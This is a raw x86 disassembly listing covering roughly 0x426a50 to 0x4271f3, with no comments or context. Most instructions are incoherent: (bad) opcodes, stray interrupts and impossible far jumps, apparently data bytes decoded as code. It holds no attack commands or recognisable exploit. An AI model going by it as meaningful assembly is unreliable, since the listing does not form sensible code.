  426a50:	mov    eax,0x98060a
  426a55:	add    BYTE PTR [eax],al
  426a57:	add    al,0x6d
  426a59:	sub    ch,cl
  426a5b:	jge    0x426a15
  426a5d:	or     cl,bh
  426a5f:	mov    eax,0xcf000000
  426a64:	mov    ch,BYTE PTR [eax]
  426a66:	mov    eax,0xbccf0a
  426a6b:	add    BYTE PTR [eax],al
  426a6d:	add    al,0xd3
  426a6f:	pusha  
  426a70:	mov    eax,0xc0cf0a
  426a75:	add    BYTE PTR [eax],al
  426a77:	iret   
  426a78:	mov    cl,BYTE PTR [edx-0x48]
  426a7b:	or     cl,bh
  426a7d:	les    eax,FWORD PTR [eax]
  426a7f:	add    BYTE PTR [eax],al
  426a81:	int    0xf9
  426a83:	mov    eax,0x9c670a
  426a88:	add    BYTE PTR [eax],al
  426a8a:	iret   
  426a8b:	loopne 0x426a2d
  426a8d:	pop    edi
  426a8e:	add    BYTE PTR ds:0xab88080,dh
  426a94:	iret   
  426a95:	enter  0x0,0x0
  426a99:	iret   
  426a9a:	mov    bh,bh
  426a9c:	mov    eax,0x90cf0a
  426aa1:	add    BYTE PTR [eax],al
  426aa3:	mov    eax,0xa0670a
  426aa8:	add    BYTE PTR [eax],al
  426aaa:	add    al,0xc9
  426aac:	stc    
  426aad:	mov    eax,0xa4670a
  426ab2:	add    BYTE PTR [eax],al
  426ab4:	int    0xf9
  426ab6:	pop    edi
  426ab7:	leave  
  426ab8:	xor    eax,0xab88080
  426abd:	iret   
  426abe:	add    BYTE PTR [eax],0x0
  426ac1:	add    ch,cl
  426ac3:	jge    0x426a7d
  426ac5:	or     cl,bh
  426ac7:	aam    0x0
  426ac9:	add    BYTE PTR [eax],al
  426acb:	int    0xc5
  426acd:	mov    eax,0xe0060a
  426ad2:	add    BYTE PTR [eax],al
  426ad4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426ad7:	or     ah,BYTE PTR [edi-0x58]
  426ada:	add    BYTE PTR [eax],al
  426adc:	add    bh,cl
  426ade:	addr16 in al,0x0
  426ae1:	add    BYTE PTR [eax],al
  426ae3:	leave  
  426ae4:	push   es
  426ae5:	lods   al,BYTE PTR ds:[esi]
  426ae6:	add    BYTE PTR [eax],al
  426ae8:	add    dh,ah
  426aea:	xor    eax,0x6c9352b
  426aef:	fadd   DWORD PTR [eax]
  426af1:	add    BYTE PTR [eax],al
  426af3:	jae    0x426b2a
  426af5:	jno    0x426b2c
  426af7:	mov    eax,0x3076cdaf
  426afc:	int    0x8d
  426afe:	xor    ch,cl
  426b00:	xchg   esi,eax
  426b01:	xor    BYTE PTR [edx+eax*1],al
  426b04:	call   ebx
  426b06:	repnz sub BYTE PTR [ebx],bh
  426b09:	jns    0x426ade
  426b0b:	mov    ebp,0xcdd35392
  426b10:	lea    esi,[eax]
  426b12:	add    al,0x2
  426b14:	(bad)  
  426b15:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b1b:	repz xchg edx,eax
  426b1d:	push   ebx
  426b1e:	jecxz  0x426b5b
  426b20:	retf   
  426b21:	add    al,0xd2
  426b23:	sbb    bl,BYTE PTR [ebx]
  426b25:	retf   
  426b26:	cmp    eax,DWORD PTR [eax]
  426b28:	inc    ebx
  426b29:	cli    
  426b2a:	das    
  426b2b:	or     cl,dl
  426b2d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b34:	das    
  426b35:	add    al,0x37
  426b37:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b3e:	xchg   esi,eax
  426b3f:	xor    BYTE PTR [ebx],bh
  426b41:	psrlq  mm5,mm3
  426b44:	xchg   edx,eax
  426b45:	add    al,0xfb
  426b47:	call   ebx
  426b49:	jmp    0xcd7d:0x87135328
  426b50:	aad    0xb8
  426b52:	cmp    edx,DWORD PTR ds:0x708d
  426b58:	add    ch,cl
  426b5a:	lea    esi,[eax]
  426b5c:	int    0xe6
  426b5e:	xor    BYTE PTR [ebx],bh
  426b60:	psrlq  mm5,mm3
  426b63:	xchg   edx,eax
  426b64:	add    al,0xf8
  426b66:	call   ebx
  426b68:	jmp    0x8832be95
  426b6d:	jge    0x426b27
  426b6f:	int    0xcc
  426b71:	lea    esi,[eax+0x0]
  426b74:	add    BYTE PTR [eax],al
  426b76:	mov    eax,0xd3b8e3f8
  426b7b:	repnz das 
  426b7d:	mov    eax,0x53b8f3e3
  426b82:	jecxz  0x426b51
  426b84:	lea    esi,[eax]
  426b86:	int    0xe6
  426b88:	xor    BYTE PTR [ebx],bh
  426b8a:	psrlq  mm5,mm3
  426b8d:	xchg   edx,eax
  426b8e:	add    al,0xf8
  426b90:	call   ebx
  426b92:	jmp    0x8832bebf
  426b97:	jge    0x426b51
  426b99:	or     dl,BYTE PTR ds:0x708d
  426b9f:	add    ch,cl
  426ba1:	lea    esi,[eax]
  426ba3:	int    0x96
  426ba5:	xor    BYTE PTR [ebx],bh
  426ba7:	(bad)  
  426ba9:	sti    
  426baa:	call   ebx
  426bac:	jmp    0x426b40
  426bae:	shr    edx,cl
  426bb0:	sub    BYTE PTR [ebx+0x13],dl
  426bb3:	int    0x96
  426bb5:	xor    BYTE PTR [edi+0x308dcdd3],al
  426bbb:	add    al,0x2
  426bbd:	(bad)  
  426bbe:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426bc4:	repz xchg edx,eax
  426bc6:	push   ebx
  426bc7:	jecxz  0x426c04
  426bc9:	retf   
  426bca:	add    al,0xd2
  426bcc:	sbb    bl,BYTE PTR [ebx]
  426bce:	retf   
  426bcf:	cmp    eax,DWORD PTR [eax]
  426bd1:	inc    ebx
  426bd2:	cli    
  426bd3:	das    
  426bd4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bda:	pop    es
  426bdb:	pop    ebx
  426bdc:	add    BYTE PTR [eax],al
  426bde:	add    bl,al
  426be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426be1:	mov    esi,0x76cf4229
  426be6:	jne    0x426bf2
  426be8:	jbe    0x426b72
  426bea:	int    0x76
  426bec:	mov    BYTE PTR [edi+0x13de37b6],bh
  426bf2:	or     bl,BYTE PTR [ecx+ecx*8]
  426bf5:	ins    BYTE PTR es:[edi],dx
  426bf6:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426bfc:	jbe    0x426c73
  426bfe:	int    0x8d
  426c00:	jge    0x426c31
  426c02:	inc    ebp
  426c03:	jge    0x426b97
  426c05:	shr    ebx,cl
  426c07:	xchg   edx,eax
  426c08:	int    0x8d
  426c0a:	jne    0x426bd9
  426c0c:	xchg   esi,eax
  426c0d:	jge    0x426c4a
  426c0f:	leave  
  426c10:	cmp    ebx,edx
  426c12:	push   ebx
  426c13:	icebp  
  426c14:	int    0x76
  426c16:	cmc    
  426c17:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c1d:	jo     0x426bee
  426c1f:	push   es
  426c20:	cmc    
  426c21:	inc    DWORD PTR [eax]
  426c23:	add    BYTE PTR [eax-0x2d],dh
  426c26:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c2d:	int    0x76
  426c2f:	in     eax,dx
  426c30:	int    0x8d
  426c32:	adc    DWORD PTR [edi],ebp
  426c34:	inc    ebp
  426c35:	jge    0x426bc9
  426c37:	shr    ebx,cl
  426c39:	xchg   edx,eax
  426c3a:	int    0x8d
  426c3c:	in     eax,dx
  426c3d:	int    0x96
  426c3f:	adc    ebx,edx
  426c41:	repnz sub ch,cl
  426c44:	iret   
  426c45:	cmc    
  426c46:	inc    DWORD PTR [eax]
  426c48:	add    ch,cl
  426c4a:	mov    DWORD PTR [ebx],edi
  426c4c:	leave  
  426c4d:	cmp    ebx,edx
  426c4f:	push   ebx
  426c50:	rol    BYTE PTR [ebx+0x7d],cl
  426c53:	das    
  426c54:	push   es
  426c55:	push   ebp
  426c56:	add    BYTE PTR [eax-0xa293280],0xc9
  426c5d:	jbe    0x426c6c
  426c5f:	(bad)  
  426c60:	ficom  WORD PTR ss:[ebx]
  426c63:	pop    ebp
  426c64:	mov    ebp,0xa25230a
  426c69:	jbe    0x426c5c
  426c6b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c71:	int    0x76
  426c73:	xchg   ebp,eax
  426c74:	int    0x8d
  426c76:	popf   
  426c77:	das    
  426c78:	inc    ebp
  426c79:	jge    0x426c0d
  426c7b:	shr    ebx,cl
  426c7d:	xchg   edx,eax
  426c7e:	int    0x8d
  426c80:	xchg   ebp,eax
  426c81:	int    0x96
  426c83:	popf   
  426c84:	cmp    ecx,ecx
  426c86:	cmp    ebx,edx
  426c88:	push   ebx
  426c89:	icebp  
  426c8a:	bound  eax,QWORD PTR [eax]
  426c8c:	(bad)  
  426c8d:	xor    al,0xd3
  426c8f:	repnz sub BYTE PTR [eax],al
  426c92:	pop    ecx
  426c93:	xor    eax,0xbd808081
  426c98:	push   eax
  426c99:	repnz add BYTE PTR [eax],al
  426c9c:	int    0x76
  426c9e:	xchg   ebp,eax
  426c9f:	int    0x8d
  426ca1:	popf   
  426ca2:	das    
  426ca3:	inc    ebp
  426ca4:	jge    0x426c38
  426ca6:	shr    ebx,cl
  426ca8:	xchg   edx,eax
  426ca9:	int    0x8d
  426cab:	xchg   ebp,eax
  426cac:	int    0x96
  426cae:	popf   
  426caf:	cmp    ecx,ecx
  426cb1:	cmp    ebx,edx
  426cb3:	push   ebx
  426cb4:	icebp  
  426cb5:	bound  eax,QWORD PTR [eax]
  426cb7:	pop    ecx
  426cb8:	xor    eax,0xd3808081
  426cbd:	repnz sub BYTE PTR [eax],al
  426cc0:	pop    ecx
  426cc1:	sub    eax,0xbd808081
  426cc6:	xchg   edx,eax
  426cc7:	repnz add BYTE PTR [eax],al
  426cca:	int    0x7
  426ccc:	xor    eax,0xcd808081
  426cd1:	mov    ch,cl
  426cd3:	jle    0x426d39
  426cd5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426cdb:	lea    ecx,ds:0x2ff176cd
  426ce1:	inc    ebp
  426ce2:	rcl    DWORD PTR [edx-0x326d422d],cl
  426ce8:	jbe    0x426cf7
  426cea:	int    0x96
  426cec:	icebp  
  426ced:	cmp    esi,eax
  426cef:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426cf5:	ror    ebp,cl
  426cf7:	lea    ecx,[eax+0x187ebb2f]
  426cfd:	push   es
  426cfe:	jge    0x426cd4
  426d00:	dec    esp
  426d01:	int    0x7
  426d03:	popf   
  426d04:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d0e:	jbe    0x426d5c
  426d10:	int    0x76
  426d12:	xor    BYTE PTR [eax],al
  426d14:	(bad)  
  426d15:	cmp    al,0x0
  426d17:	(bad)  
  426d18:	cmc    
  426d19:	add    dh,dl
  426d1b:	sub    al,0x0
  426d1d:	(bad)  
  426d1e:	and    al,0x0
  426d20:	(bad)  
  426d21:	sbb    al,0x0
  426d23:	(bad)  
  426d24:	adc    al,0xbd
  426d26:	test   ch,dh
  426d28:	add    BYTE PTR [eax],al
  426d2a:	or     al,BYTE PTR [esi]
  426d2c:	adc    edi,edi
  426d2e:	add    BYTE PTR [eax],al
  426d30:	int    0x76
  426d32:	cmp    al,0x4
  426d34:	fcom   QWORD PTR [eax+eax*4]
  426d37:	aam    0x1a
  426d39:	int    0x76
  426d3b:	cmp    al,0x4
  426d3d:	fsub   QWORD PTR [eax+eax*4]
  426d40:	aam    0x4e
  426d42:	int    0x6
  426d44:	adc    edi,edi
  426d46:	add    BYTE PTR [eax],al
  426d48:	int    0x8d
  426d4a:	cmp    al,0xa
  426d4c:	outs   dx,BYTE PTR ds:[esi]
  426d4d:	sbb    al,0xec
  426d4f:	push   ebx
  426d50:	add    dh,dl
  426d52:	cmp    al,0x0
  426d54:	(bad)  
  426d55:	cmc    
  426d56:	mov    ebp,0x6daa
  426d5b:	stos   BYTE PTR es:[edi],al
  426d5c:	test   al,0x63
  426d5e:	retf   
  426d5f:	shl    BYTE PTR [eax+eax*4],cl
  426d62:	xchg   esi,eax
  426d63:	int    0xed
  426d65:	jno    0x426dd8
  426d67:	cwde   
  426d68:	leave  
  426d69:	jbe    0x426d68
  426d6b:	dec    ecx
  426d6c:	and    DWORD PTR [esi-0x68936cb],eax
  426d72:	inc    ecx
  426d73:	and    DWORD PTR [esi-0x28932cb],eax
  426d79:	int    0xd6
  426d7b:	std    
  426d7c:	sar    bh,0x5f
  426d7f:	shl    DWORD PTR [ecx],1
  426d81:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426d87:	sti    
  426d88:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426d8e:	push   ebx
  426d8f:	jns    0x426d5e
  426d91:	(bad)  
  426d92:	mov    BYTE PTR [ebx+0x11],al
  426d95:	int    0x76
  426d97:	std    
  426d98:	aam    0xc4
  426d9a:	int    0xd6
  426d9c:	std    
  426d9d:	cmp    edx,ebx
  426d9f:	cmp    edi,ebx
  426da1:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426da7:	push   ebx
  426da8:	jns    0x426d77
  426daa:	(bad)  
  426dab:	dec    esp
  426dac:	inc    ebx
  426dad:	adc    esp,edx
  426daf:	pop    ebx
  426db0:	int    0x96
  426db2:	xor    BYTE PTR [edx-0x32b31933],bl
  426db8:	jbe    0x426d42
  426dba:	cmp    esi,edi
  426dbc:	push   es
  426dbd:	add    ah,dl
  426dbf:	push   esi
  426dc0:	pop    ebx
  426dc1:	retf   0x8624
  426dc4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426dca:	das    
  426dcb:	push   es
  426dcc:	fcmovbe st,st(6)
  426dce:	dec    esi
  426dcf:	add    al,0xf4
  426dd1:	adc    DWORD PTR [edx],0xffffffc5
  426dd4:	fwait
  426dd5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426ddc:	dec    esp
  426ddd:	adc    ch,ah
  426ddf:	in     eax,dx
  426de0:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426de7:	lea    ebp,[edi]
  426de9:	retf   0x2fa6
  426dec:	or     DWORD PTR [esi+eax*4],esp
  426def:	js     0x426e34
  426df1:	clc    
  426df2:	or     BYTE PTR [esi],0x63
  426df5:	int    0x76
  426df7:	stc    
  426df8:	cmp    edx,ebx
  426dfa:	int    0x8d
  426dfc:	stc    
  426dfd:	add    al,0x2
  426dff:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e05:	std    
  426e06:	cmp    edx,ebx
  426e08:	int    0x8d
  426e0a:	std    
  426e0b:	cmp    edx,DWORD PTR [ebx]
  426e0d:	shl    edx,cl
  426e0f:	sub    bl,dl
  426e11:	mov    ebp,0xa8d35392
  426e16:	retf   
  426e17:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e1b:	int    0xed
  426e1d:	add    al,0xed
  426e1f:	(bad)  
  426e20:	leave  
  426e21:	jbe    0x426e20
  426e23:	dec    ecx
  426e24:	and    DWORD PTR [esi+0x21416135],eax
  426e2a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e30:	jbe    0x426e46
  426e32:	or     dh,BYTE PTR [esi+0x14]
  426e35:	int    0x76
  426e37:	adc    al,0xcd
  426e39:	add    DWORD PTR ds:0xcd808081,ebp
  426e3f:	lea    edx,[ecx*8+0x2d0acd80]
  426e46:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e50:	lea    esi,[ebp-0x32028933]
  426e56:	(bad)  
  426e57:	std    
  426e58:	cwde   
  426e59:	call   0x3b85:0x82cfffc0
  426e60:	jns    0x426e35
  426e62:	mov    ebp,0xf03baa92
  426e67:	shl    edx,cl
  426e69:	sub    BYTE PTR [ebx-0x2d],dl
  426e6c:	or     dh,BYTE PTR [esi-0x63]
  426e6f:	int    0x76
  426e71:	std    
  426e72:	int    0x8d
  426e74:	std    
  426e75:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e78:	mov    ebp,0xd3f03b92
  426e7d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426e81:	or     dh,BYTE PTR [esi-0x53]
  426e84:	int    0x76
  426e86:	mov    ch,0xcd
  426e88:	ins    BYTE PTR es:[edi],dx
  426e89:	jo     0x426e8f
  426e8b:	mov    ebp,0xf1760a4c
  426e90:	int    0x76
  426e92:	mov    ch,0xcd
  426e94:	ins    BYTE PTR es:[edi],dx
  426e95:	pop    esp
  426e96:	int    0x8d
  426e98:	mov    ch,0x7c
  426e9a:	push   es
  426e9b:	outs   dx,BYTE PTR ds:[esi]
  426e9c:	xchg   esp,eax
  426e9d:	int    0x76
  426e9f:	mov    ch,0xd4
  426ea1:	sbb    al,0xcd
  426ea3:	ins    BYTE PTR es:[edi],dx
  426ea4:	pop    esp
  426ea5:	int    0x8d
  426ea7:	mov    ch,0xcd
  426ea9:	jle    0x426e3f
  426eab:	jl     0x426ea5
  426ead:	icebp  
  426eae:	sub    edi,DWORD PTR [ebp-0x33]
  426eb1:	jbe    0x426e68
  426eb3:	int    0x6c
  426eb5:	pop    esp
  426eb6:	xchg   ebx,edx
  426eb8:	in     al,dx
  426eb9:	xchg   ebp,ecx
  426ebb:	ins    BYTE PTR es:[edi],dx
  426ebc:	xchg   esp,eax
  426ebd:	or     dh,BYTE PTR [esi-0x43]
  426ec0:	int    0x76
  426ec2:	std    
  426ec3:	int    0x8d
  426ec5:	std    
  426ec6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ec9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426ed0:	push   ebx
  426ed1:	ror    DWORD PTR [edx],cl
  426ed3:	jbe    0x426ee9
  426ed5:	int    0x76
  426ed7:	std    
  426ed8:	int    0x8d
  426eda:	std    
  426edb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ede:	lock shl edx,cl
  426ee1:	sub    bl,dl
  426ee3:	mov    ebp,0xad35392
  426ee8:	jbe    0x426efe
  426eea:	int    0x76
  426eec:	std    
  426eed:	int    0x8d
  426eef:	std    
  426ef0:	cmp    esi,eax
  426ef2:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ef5:	repnz sub bl,dl
  426ef8:	mov    ebp,0xcdd35392
  426efd:	lea    esi,[eax]
  426eff:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f05:	jbe    0x426f1b
  426f07:	cmp    DWORD PTR [ecx],esp
  426f09:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f0f:	and    DWORD PTR [esi+0x1476c935],eax
  426f15:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f1b:	xchg   BYTE PTR [eax-0x2893280],al
  426f21:	int    0x8d
  426f23:	std    
  426f24:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f27:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f2e:	push   ebx
  426f2f:	ror    DWORD PTR [edx],cl
  426f31:	jbe    0x426ee0
  426f33:	int    0x76
  426f35:	mov    ebp,0xa4c7687
  426f3a:	jbe    0x426ed9
  426f3c:	add    dh,dl
  426f3e:	popf   
  426f3f:	add    dh,dl
  426f41:	dec    esp
  426f42:	int    0x8d
  426f44:	mov    ch,0xbd
  426f46:	neg    bh
  426f48:	add    BYTE PTR [eax],al
  426f4a:	or     dh,BYTE PTR [esi+0x14]
  426f4d:	int    0x76
  426f4f:	adc    al,0x6
  426f51:	ins    DWORD PTR es:[edi],dx
  426f52:	aam    0x60
  426f54:	int    0x76
  426f56:	popf   
  426f57:	or     dh,BYTE PTR [esi-0x5b]
  426f5a:	int    0x76
  426f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f5d:	int    0x8d
  426f5f:	dec    esp
  426f60:	xor    edx,ebx
  426f62:	or     dh,BYTE PTR [esi-0x5b]
  426f65:	int    0x76
  426f67:	adc    al,0xcd
  426f69:	lea    edx,[ecx*8+0x6e87306c]
  426f70:	dec    esp
  426f71:	int    0x8d
  426f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f74:	inc    ebx
  426f75:	jge    0x426ef9
  426f77:	sbb    ch,cl
  426f79:	jbe    0x426f8f
  426f7b:	int    0x6c
  426f7d:	dec    esp
  426f7e:	int    0x8d
  426f80:	adc    al,0x87
  426f82:	outs   dx,BYTE PTR ds:[esi]
  426f83:	mov    ch,cl
  426f85:	lea    esp,[ebp-0x2e142ccd]
  426f8b:	test   DWORD PTR [eax+0x2149bf80],eax
  426f91:	xchg   BYTE PTR ds:0xc90da60a,dh
  426f97:	jbe    0x427016
  426f99:	inc    ecx
  426f9a:	and    DWORD PTR [esi+0x7576c935],eax
  426fa0:	cmp    DWORD PTR [ecx],esp
  426fa2:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426fa8:	and    DWORD PTR [esi+0xd76cf35],eax
  426fae:	or     dh,BYTE PTR [esi-0xb]
  426fb1:	iret   
  426fb2:	jbe    0x427031
  426fb4:	or     dh,BYTE PTR [esi+0x11]
  426fb7:	iret   
  426fb8:	jbe    0x42702f
  426fba:	or     dh,BYTE PTR [esi+0x14]
  426fbd:	iret   
  426fbe:	jbe    0x42702d
  426fc0:	or     dh,BYTE PTR [esi-0x13]
  426fc3:	int    0x76
  426fc5:	std    
  426fc6:	int    0x8d
  426fc8:	std    
  426fc9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fcc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426fd3:	push   ebx
  426fd4:	ror    DWORD PTR [edx],cl
  426fd6:	jbe    0x426f7d
  426fd8:	jmp    0x426fed
  426fda:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  426fe0:	and    DWORD PTR [esi-0x22fad0cb],eax
  426fe6:	xchg   DWORD PTR [eax+0x4cc080],eax
  426fec:	(bad)  
  426fed:	popf   
  426fee:	iret   
  426fef:	jbe    0x426fc1
  426ff1:	jo     0x426fb0
  426ff3:	xlat   BYTE PTR ds:[ebx]
  426ff4:	fild   WORD PTR [eax]
  426ff6:	add    ch,cl
  426ff8:	jbe    0x426ff3
  426ffa:	int    0x8d
  426ffc:	stc    
  426ffd:	cmp    edi,DWORD PTR [ecx+0x3b]
  427000:	lock shl edx,cl
  427003:	sub    bl,dl
  427005:	mov    ebp,0xad35392
  42700a:	jbe    0x426fb9
  42700c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427012:	int    0x76
  427014:	xchg   ebp,eax
  427015:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42701b:	in     eax,0x28
  42701d:	push   ebx
  42701e:	popf   
  42701f:	or     ah,BYTE PTR [esi-0x689325b]
  427025:	int    0x8d
  427027:	stc    
  427028:	cmp    esi,eax
  42702a:	shl    edx,cl
  42702c:	sub    BYTE PTR [ebx],bh
  42702e:	jns    0x427003
  427030:	mov    ebp,0xcdd35392
  427035:	(bad)  
  427036:	stc    
  427037:	int    0x96
  427039:	stc    
  42703a:	cmp    ecx,DWORD PTR [edi]
  42703c:	cmp    ebx,ecx
  42703e:	shr    ebx,cl
  427040:	xchg   edx,eax
  427041:	shr    edx,cl
  427043:	sub    BYTE PTR [ebx+0x13],dl
  427046:	xchg   ebx,edx
  427048:	int    0x8d
  42704a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42704b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427051:	sub    ch,cl
  427053:	jbe    0x42704e
  427055:	int    0x8d
  427057:	stc    
  427058:	cmp    edi,DWORD PTR [ecx+0x3b]
  42705b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427062:	push   ebx
  427063:	shl    DWORD PTR [eax-0x40],cl
  427066:	dec    esp
  427067:	iret   
  427068:	jbe    0x42703a
  42706a:	jo     0x427029
  42706c:	sti    
  42706d:	std    
  42706e:	add    BYTE PTR [eax],al
  427070:	int    0x76
  427072:	std    
  427073:	int    0x8d
  427075:	std    
  427076:	cmp    edi,DWORD PTR [ecx+0x3b]
  427079:	lock shl edx,cl
  42707c:	sub    bl,dl
  42707e:	mov    ebp,0xcdd35392
  427083:	lea    esp,[ebp+0x28d47d43]
  427089:	int    0x76
  42708b:	std    
  42708c:	int    0x8d
  42708e:	std    
  42708f:	cmp    edi,DWORD PTR [ecx+0x3b]
  427092:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427099:	push   ebx
  42709a:	shl    DWORD PTR [eax-0x40],cl
  42709d:	dec    esp
  42709e:	iret   
  42709f:	jbe    0x427071
  4270a1:	jo     0x427060
  4270a3:	mov    edi,0xcd0000fd
  4270a8:	jbe    0x42709f
  4270aa:	int    0x8d
  4270ac:	cmc    
  4270ad:	int    0x89
  4270af:	int    0x80
  4270b1:	cmp    esi,eax
  4270b3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270b6:	repnz sub bl,dl
  4270b9:	mov    ebp,0xcad35392
  4270be:	je     0x427045
  4270c0:	ror    ch,1
  4270c2:	(bad)  
  4270c3:	std    
  4270c4:	int    0x96
  4270c6:	std    
  4270c7:	cmp    ecx,DWORD PTR [edi]
  4270c9:	cmp    ebx,ecx
  4270cb:	shr    ebx,cl
  4270cd:	xchg   edx,eax
  4270ce:	shr    edx,cl
  4270d0:	sub    BYTE PTR [edi],ch
  4270d2:	pop    ecx
  4270d3:	ins    DWORD PTR es:[edi],dx
  4270d4:	push   ebx
  4270d5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270d8:	das    
  4270d9:	add    eax,0x80809212
  4270de:	int    0x76
  4270e0:	adc    ebp,ecx
  4270e2:	lea    edx,[ecx]
  4270e4:	int    0x89
  4270e6:	int    0x80
  4270e8:	cmp    esi,eax
  4270ea:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270ed:	repnz sub bl,dl
  4270f0:	mov    ebp,0xcad35392
  4270f5:	je     0x42707c
  4270f7:	ror    ch,1
  4270f9:	(bad)  
  4270fa:	std    
  4270fb:	int    0x96
  4270fd:	std    
  4270fe:	cmp    ecx,DWORD PTR [edi]
  427100:	cmp    ebx,ecx
  427102:	shr    ebx,cl
  427104:	xchg   edx,eax
  427105:	shr    edx,cl
  427107:	sub    BYTE PTR [edi],ch
  427109:	pop    ecx
  42710a:	ins    DWORD PTR es:[edi],dx
  42710b:	push   ebx
  42710c:	adc    eax,DWORD PTR [ebx-0x2d]
  42710f:	das    
  427110:	add    eax,0x8080928a
  427115:	int    0x76
  427117:	adc    al,0xcd
  427119:	lea    edx,[ecx*8+0x3b80cd89]
  427120:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427124:	repnz sub bl,dl
  427127:	mov    ebp,0xcad35392
  42712c:	je     0x4270b3
  42712e:	ror    ch,1
  427130:	(bad)  
  427131:	std    
  427132:	int    0x96
  427134:	std    
  427135:	cmp    ecx,DWORD PTR [edi]
  427137:	cmp    ebx,ecx
  427139:	shr    ebx,cl
  42713b:	xchg   edx,eax
  42713c:	shr    edx,cl
  42713e:	sub    BYTE PTR [edi],ch
  427140:	pop    ecx
  427141:	ins    DWORD PTR es:[edi],dx
  427142:	push   ebx
  427143:	adc    eax,DWORD PTR [ebx-0x2d]
  427146:	das    
  427147:	add    eax,0x8080921b
  42714c:	int    0x76
  42714e:	in     eax,dx
  42714f:	int    0x8d
  427151:	in     eax,dx
  427152:	int    0x89
  427154:	int    0x80
  427156:	cmp    esi,eax
  427158:	cmp    edi,DWORD PTR [ecx-0x2d]
  42715b:	repnz sub bl,dl
  42715e:	mov    ebp,0xcad35392
  427163:	je     0x4270ea
  427165:	ror    ch,1
  427167:	(bad)  
  427168:	std    
  427169:	int    0x96
  42716b:	std    
  42716c:	cmp    ecx,DWORD PTR [edi]
  42716e:	cmp    ebx,ecx
  427170:	shr    ebx,cl
  427172:	xchg   edx,eax
  427173:	shr    edx,cl
  427175:	sub    BYTE PTR [edi],ch
  427177:	pop    ecx
  427178:	ins    DWORD PTR es:[edi],dx
  427179:	push   ebx
  42717a:	adc    eax,DWORD PTR [ebx-0x2d]
  42717d:	das    
  42717e:	add    eax,0x808081a5
  427183:	int    0x76
  427185:	adc    ebp,ecx
  427187:	lea    edx,[ecx]
  427189:	int    0x89
  42718b:	int    0x80
  42718d:	cmp    esi,eax
  42718f:	shl    edx,cl
  427191:	sub    BYTE PTR [ebx],bh
  427193:	jns    0x427168
  427195:	mov    ebp,0xcad35392
  42719a:	je     0x427121
  42719c:	ror    ch,1
  42719e:	(bad)  
  42719f:	cmc    
  4271a0:	int    0x89
  4271a2:	int    0x96
  4271a4:	cmc    
  4271a5:	int    0x22
  4271a7:	cmp    ecx,DWORD PTR [edi]
  4271a9:	shr    ebx,cl
  4271ab:	xchg   edx,eax
  4271ac:	cmp    ebx,ecx
  4271ae:	shr    edx,cl
  4271b0:	sub    BYTE PTR [ebx+0x13],dl
  4271b3:	retf   0x4d8c
  4271b6:	rol    BYTE PTR [edx-0x2d],1
  4271b9:	int    0x8d
  4271bb:	adc    al,0xcd
  4271bd:	mov    ebp,ecx
  4271bf:	xchg   esi,eax
  4271c0:	adc    al,0xcd
  4271c2:	and    bh,BYTE PTR [ebx]
  4271c4:	psrlq  mm5,mm3
  4271c7:	xchg   edx,eax
  4271c8:	cmp    ebx,ecx
  4271ca:	shr    edx,cl
  4271cc:	sub    BYTE PTR [ebx+0x13],dl
  4271cf:	retf   0x4d8c
  4271d2:	ror    BYTE PTR [edx-0x2d],1
  4271d5:	int    0x8d
  4271d7:	cmc    
  4271d8:	int    0x89
  4271da:	int    0x96
  4271dc:	cmc    
  4271dd:	int    0x22
  4271df:	cmp    ecx,DWORD PTR [edi]
  4271e1:	cmp    ebx,ecx
  4271e3:	shr    ebx,cl
  4271e5:	xchg   edx,eax
  4271e6:	shr    edx,cl
  4271e8:	sub    BYTE PTR [ebx+0x13],dl
  4271eb:	retf   0x4d8c
  4271ee:	push   ebp
  4271ef:	pusha  
  4271f0:	jge    0x427221
  4271f2:	push   es
  4271f3:	mov    esp,0xcd808081
